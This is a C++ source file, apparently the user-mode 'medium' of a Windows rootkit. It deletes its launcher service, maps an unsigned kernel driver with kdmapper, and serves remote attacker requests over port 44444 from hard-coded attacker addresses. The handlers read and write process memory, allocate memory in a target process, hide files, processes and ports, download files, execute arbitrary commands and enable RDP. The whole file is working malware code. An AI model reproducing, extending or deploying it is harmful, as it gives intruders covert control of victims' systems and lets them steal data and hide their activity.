#include "medium.h"
#include "requests.h"
#include "piping.h"


// Global medium variables:
const char* MainPipeName = "\\\\.\\pipe\\ShrootPipe";


int TerminateMedium(NETWORK_INFO* SndInfo, HANDLE* PipeHandle, BOOL* IsValidPipe, int ReturnStatus) {
	if (SndInfo != NULL) {
		closesocket(SndInfo->AsoSock);
	}
	if (IsValidPipe != NULL) {
		*IsValidPipe = FALSE;
	}
	if (PipeHandle != NULL) {
		DisconnectNamedPipe(*PipeHandle);
		ClosePipe(PipeHandle);
	}
	return ReturnStatus;
}


DWORD ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe) {
	DWORD LastError = 0;
	*IsValidPipe = ConnectNamedPipe(*PipeHandle, NULL);
	if (!*IsValidPipe) {
		LastError = GetLastError();
		if (LastError == ERROR_PIPE_CONNECTED) {
			*IsValidPipe = TRUE;
			LogMessage("MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", MediumLog, FALSE, 0);
		}
		else {
			LogMessage("MainMedium pipe - error while connecting to pipe\n", MediumLog, TRUE, LastError);
			ClosePipe(PipeHandle);
		}
	}
	else {
		LogMessage("MainMedium pipe - driver connected to pipe like expected\n", MediumLog, FALSE, 0);
	}
	return LastError;
}


int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe) {
	int OprResult = 0;
	DWORD LastError = 0;
	PASS_DATA result;
	PVOID SendBuf = NULL;
	ULONG SendSize = 0;
	ROOTKIT_OPERATION RootStat = RKOP_NOOPERATION;
	ROOTKIT_MEMORY OprBuffer;
	PVOID LocalRead = NULL;
	PVOID AttrBuffer = NULL;
	PVOID InitialString = NULL;  // Usually receives a module name but can also receive other strings (such as debug message)
	ULONG ReadSize = 0;
	ULONG InitialSize = 0;
	ULONG64 AttrBufferSize = 0;
	BOOL ValidInit = FALSE;
	ROOTKIT_UNEXERR SysErrInit = successful;
	char MdlMalloc = 1;
	char NextLine = '\n';
	char NullTerm = '\0';


	if (IsValidPipe == NULL) {
		closesocket(SndInfo.AsoSock);
		return -1;
	}
	while (TRUE) {
		if (!*IsValidPipe) {
			// Create valid pipe for communications:
			*IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
			while (!IsValidPipe) {
				*IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
			}

			// Connect to driver client with pipe:
			ConnectToNamedPipe(PipeHandle, MediumLog, IsValidPipe);
		}

		// Actual medium operations:
		while (*IsValidPipe) {

			// Get operation to perform:
			result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0, MediumLog);
			if (result.err || result.value != sizeof(RootStat)) {
				if (result.Term) {
					LogMessage("Critical error occured, closing connection with specific client..\n", MediumLog, TRUE, GetLastError());
					return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, 0);
				}
				break;
			}
			if (ShouldQuit()) {

				// Special error/event occured, should quit and stop working:
				RootStat = RKOP_TERMINATE;
				result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0, MediumLog);
				if (!result.err && result.value == sizeof(RootStat)) {
					result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0, MediumLog);
					if (!result.err && result.value == sizeof(RootStat) && RootStat == RKOP_TERMINATE) {
						LogMessage("Termination initiated from here accepted by client\n", MediumLog, FALSE, 0);
					}
				}
				return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, -1);
			}


			// resend the type of request back to client:
			result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0, MediumLog);
			if (result.err || result.value != sizeof(RootStat)) {
				continue;
			}


			// Receive the main module for the function:
			result = root_internet::RecvData(SndInfo.AsoSock, sizeof(InitialSize), &InitialSize, FALSE, 0, MediumLog);
			if (result.err || result.value != sizeof(InitialSize)) {
				goto InitStringValidate;
			}
			InitialString = malloc(InitialSize);
			if (InitialString == NULL) {
				MdlMalloc = 0;
				root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0, MediumLog);  // Send MEMALLOC error
				goto InitStringValidate;
			}
			result = root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0, MediumLog);
			if (result.err || result.value != sizeof(MdlMalloc)) {
				goto InitStringValidate;
			}
			result = root_internet::RecvData(SndInfo.AsoSock, InitialSize, InitialString, FALSE, 0, MediumLog);
			if (!result.err && result.value == InitialSize) {
				ValidInit = TRUE;
				LogMessage("Init string received - ", MediumLog, FALSE, 0);
				LogMessage((char*)InitialString, MediumLog, FALSE, 0);
				LogMessage("\n", MediumLog, FALSE, 0);
			}

		InitStringValidate:
			if (!ValidInit) {
				if (InitialString != NULL) {
					free(InitialString);
				}
				RootStat = RKOP_NOOPERATION;
			}
			else {
				ValidInit = FALSE;
			}


			// Operate by client request in the various ways possible:
			switch (RootStat) {
			case RKOP_WRITE:

				// Write into process virtual memory (from user supplied buffer / another process):
				OprResult = DriverCalls::WriteKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				free(InitialString);
				break;

			case RKOP_READ:

				// Read from process virtual memory:
				OprResult = DriverCalls::ReadKernelCall(SndInfo.AsoSock, LocalRead, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				free(LocalRead);
				free(InitialString);
				break;

			case RKOP_MDLBASE:

				// Get the base address of a process module (executable) in memory:
				LogMessage("No extra buffer parameters for getting the module base..\n", MediumLog, FALSE, 0);
				OprResult = DriverCalls::MdlBaseKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				else {
					printf("Base address of %s in memory: %p\n", (char*)InitialString, OprBuffer.Out);
				}
				free(InitialString);
				break;

			case RKOP_SYSINFO:

				// return specific information about the target system (with ZwQuerySystemInformation):
				if (!ValidateInfoTypeString((char*)InitialString)) {
					LogMessage("Client sent invalid system info string\n", MediumLog, TRUE, GetLastError());
					free(InitialString);
					break;
				}

				result = root_internet::RecvData(SndInfo.AsoSock, sizeof(AttrBufferSize), &AttrBufferSize, FALSE, 0, MediumLog);
				if (result.err || result.value != sizeof(AttrBufferSize)) {
					LogMessage("Cannot get size of initial system buffer\n", MediumLog, TRUE, GetLastError());
					free(InitialString);
					break;
				}

				AttrBuffer = malloc(AttrBufferSize);
				if (AttrBuffer == NULL) {
					LogMessage("Cannot allocate initial system buffer\n", MediumLog, TRUE, GetLastError());
					free(InitialString);
					SysErrInit = memalloc;
				}
				if (SysErrInit == successful) {
					result = root_internet::RecvData(SndInfo.AsoSock, (int)AttrBufferSize, AttrBuffer, FALSE, 0, MediumLog);
					if (result.err || result.value != AttrBufferSize) {
						LogMessage("Cannot get initial system buffer\n", MediumLog, TRUE, GetLastError());
						free(AttrBuffer);
						free(InitialString);
						break;
					}
				}

				OprResult = DriverCalls::SysInfoKernelCall(SndInfo.AsoSock, &OprBuffer, AttrBuffer, (char*)InitialString, SysErrInit, AttrBufferSize, PipeHandle, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				else {
					LogMessage("Success operation system information\n", MediumLog, FALSE, 0);
				}
				free(AttrBuffer);
				free(InitialString);
				break;

			case RKOP_PRCMALLOC:

				// Allocate memory in a specific process (and leave it committed for now):
				LogMessage("No extra buffer parameters for allocating specific memory..\n", MediumLog, FALSE, 0);
				OprResult = DriverCalls::AllocSpecKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				free(InitialString);
				break;

			case RKOP_HIDEFILE:

				// Hide file/folder by dynamic request:
				OprResult = DriverCalls::HideFileKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				free(InitialString);
				break;

			case RKOP_HIDEPROC:

				// Hide process by dynamic request:
				OprResult = DriverCalls::HideProcessKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				free(InitialString);
				break;

			case RKOP_HIDEPORT:

				// Hide ports by dynamic request:
				OprResult = DriverCalls::HidePortCommunicationKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				free(InitialString);
				break;

			case RKOP_GETFILE:

				// Get file from target machine:
				OprResult = RegularRequests::DownloadFileRequest(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				free(InitialString);
				break;
				
			case RKOP_EXECOMMAND:

				// Execute cmd command:
				OprResult = RegularRequests::RemoteCommandRequest(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				free(InitialString);
				break;

			case RKOP_ACTIVATERDP:

				// Activate RDP service:
				OprResult = RegularRequests::ActivateRDPRequest(SndInfo.AsoSock, &OprBuffer, MediumLog);
				if (OprResult != 1) {
					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
				}
				free(InitialString);
				break;

			default:
				if (result.Term) {
					LogMessage("Critical error occured, closing connection with specific client..\n", MediumLog, TRUE, GetLastError());
					return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, -1);
				}
				break;
			}

			// Clean important variables and network stack from last request:
			root_internet::CleanNetStack(SndInfo.AsoSock, MediumLog);
			SendSize = 0;
			SendBuf = NULL;
			SysErrInit = successful;
			if (OprResult == -1) {
				return TerminateMedium(NULL, PipeHandle, IsValidPipe, -1);  // No need to close socket
			}
			OprResult = 0;
			LogMessage("Current medium iteration finished\n", MediumLog, FALSE, 0);
		}
	}
	return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, 0);
}


int main(int argc, char* argv[]) {
	SOCKET MediumSocket;
	int SockaddrLen = sizeof(sockaddr);
	char MediumIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
	char ClientIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
	USHORT MediumConnectionPort = 44444;
	USHORT ClientConnectionPort = 44444;
	NETWORK_INFO ConnectionConfigArray[3];

	HANDLE PipeHandle = INVALID_HANDLE_VALUE;
	BOOL IsValidPipe = FALSE;
	DWORD LastError = 0;
	LogFile MediumLog = { 0 };
	RETURN_LAST ReturnStatus = { 0 };
	int MediumResult = 0;
	const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1~192.168.1.32";  // Possible addresses of client
	
	MediumLog.InitiateFile("C:\\nosusfolder\\verysus\\MediumLogFile.txt");


	// Destroy launching service:
	if (system("sc stop RootAuto > nul && sc delete RootAuto > nul") == -1) {
		LogMessage("Cannot destroy launching service\n", &MediumLog, TRUE, GetLastError());
		MediumLog.CloseLog();
		return 0;
	}
	LogMessage("Destroyed launching service!\n", &MediumLog, FALSE, 0);


	// Create dispatch function that will be triggered for CTRL_SHUTDOWN_EVENT:
	if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
		LogMessage("Cannot create control handler to handle reboots\n", &MediumLog, TRUE, GetLastError());
		MediumLog.CloseLog();
		return 0;
	}
	LogMessage("Created control handler to handle reboots!\n", &MediumLog, FALSE, 0);


	// Get IP addresses of target and attacker:
	if (!address_config::MatchIpAddresses(MediumIP, ClientIP, AttackAddresses)) {
		LogMessage("Cannot find the target address and the matching attacker address\n", &MediumLog, TRUE, GetLastError());
		MediumLog.CloseLog();
		return 0;
	}
	printf("Target: %s, Attacker: %s\n", MediumIP, ClientIP);


	// Make sure that all depended-on files exist on target machine (folders + files):
	LastError = VerifyDependencies(ClientIP);
	if (LastError != 0) {
		return LastError;
	}


	// Create valid pipe for communications initial:
	IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
	while (!IsValidPipe) {
		IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
	}


	// Activate kdmapper with driver as parameter:
	ReturnStatus = RealTime(TRUE);
	if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
		return 0;
	}
	if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
		LogMessage("Failed to activate service manager with driver as parameter\n", &MediumLog, TRUE, GetLastError());
		MediumLog.CloseLog();
		return 0;
	}
	LogMessage("kdmapper mapped driver successfully!\n", &MediumLog, FALSE, 0);
	ReturnStatus = RealTime(FALSE);
	if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
		return 0;
	}


	// Connect to driver client with pipe initial:
	LastError = ConnectToNamedPipe(&PipeHandle, &MediumLog, &IsValidPipe);
	if (LastError == ERROR_PIPE_CONNECTED) {
		IsValidPipe = TRUE;
		LastError = 0;
	}
	else if (LastError != 0) {
		MediumLog.CloseLog();
		DisconnectNamedPipe(PipeHandle);
		ClosePipe(&PipeHandle);
		return 0;
	}


	// Set up network structs for main connection with client:
	root_internet::SetNetStructs(MediumIP, ClientIP, MediumConnectionPort, ClientConnectionPort, ConnectionConfigArray);
	if (!root_internet::StartComms(ConnectionConfigArray, &MediumLog)) {
		LogMessage("Quitting (internet/socket communication initiation error)..\n", &MediumLog, TRUE, GetLastError());
		MediumLog.CloseLog();
		DisconnectNamedPipe(PipeHandle);
		ClosePipe(&PipeHandle);
		return 0;
	}


	// Create an infinite loop to keep getting connections from instances of client:
	while (TRUE) {
		MediumSocket = accept(ConnectionConfigArray[0].AsoSock, (sockaddr*)&ConnectionConfigArray[1].AddrInfo, &SockaddrLen);
		if (MediumSocket == INVALID_SOCKET) {
			LogMessage("Could not accept connection with socket object\n", &MediumLog, TRUE, WSAGetLastError());
			continue;
		}
		LogMessage("Initialization of connection succeeded, proceeding to start receiving requests..\n", &MediumLog, FALSE, 0);
		
		ConnectionConfigArray[1].AsoSock = MediumSocket;
		MediumResult = ServeClient(ConnectionConfigArray[1], ConnectionConfigArray[0], &PipeHandle, &MediumLog, &IsValidPipe);
		root_internet::CleanNetStack(ConnectionConfigArray[1].AsoSock, &MediumLog);
		printf("Disconnected from (%s, %hu)\n", ConnectionConfigArray[1].IP, ConnectionConfigArray[1].Port);
		
		if (MediumResult == -1) {

			// Special "global" reason has made medium disconnect from client:
			LogMessage("Termination complete\n", &MediumLog, FALSE, 0);
			closesocket(ConnectionConfigArray[0].AsoSock);
			WSACleanup();
			MediumLog.CloseLog();
			DisconnectNamedPipe(PipeHandle);
			ClosePipe(&PipeHandle);
			return 0;
		}
	}

	closesocket(ConnectionConfigArray[0].AsoSock);
	WSACleanup();
	MediumLog.CloseLog();
	DisconnectNamedPipe(PipeHandle);
	ClosePipe(&PipeHandle);
	return 1;
}
